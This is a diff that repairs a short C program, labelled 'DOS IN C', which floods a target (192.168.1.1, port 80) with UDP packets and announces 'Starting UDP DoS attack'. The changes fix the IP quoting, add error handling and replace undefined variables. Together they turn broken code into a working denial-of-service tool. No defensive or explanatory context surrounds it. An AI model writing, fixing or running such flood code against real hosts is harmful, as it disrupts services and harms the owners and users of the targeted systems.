@@ -434,7 +434,6 @@ DOS IN C:
 #include <arpa/inet.h>
 #include <unistd.h>
 
-// Number of packets to send
 #define PACKET_COUNT 1000
 
 int main() {
@@ -442,23 +441,28 @@ int main() {
     struct sockaddr_in target;
     char buffer[1024]; // UDP payload
 
-
     // Create UDP socket
     sock = socket(AF_INET, SOCK_DGRAM, 0);
-
+    if (sock < 0) {
+        perror("Socket creation failed");
+        return 1;
+    }
 
     // Set target details
     target.sin_family = AF_INET;
     target.sin_port = htons(80);
-    target.sin_addr.s_addr = inet_addr(192.168.1.1);
+    target.sin_addr.s_addr = inet_addr("192.168.1.1"); // Fixed: IP inside quotes
 
     // Fill buffer with random data
     memset(buffer, 'A', sizeof(buffer));
 
-    printf("Starting UDP DoS attack on %s:%d\n", target_ip, target_port);
+    printf("Starting UDP DoS attack on %s:%d\n", inet_ntoa(target.sin_addr), ntohs(target.sin_port));
 
     for (int i = 0; i < PACKET_COUNT; i++) {
-        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
+        if (sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
+            perror("Packet send failed");
+            break;
+        }
         printf("Packet %d sent\n", i + 1);
     }
 
@@ -468,6 +472,7 @@ int main() {
     close(sock);
     return 0;
 }
+
 
 
 ________________________________________________________________________________________________________________________
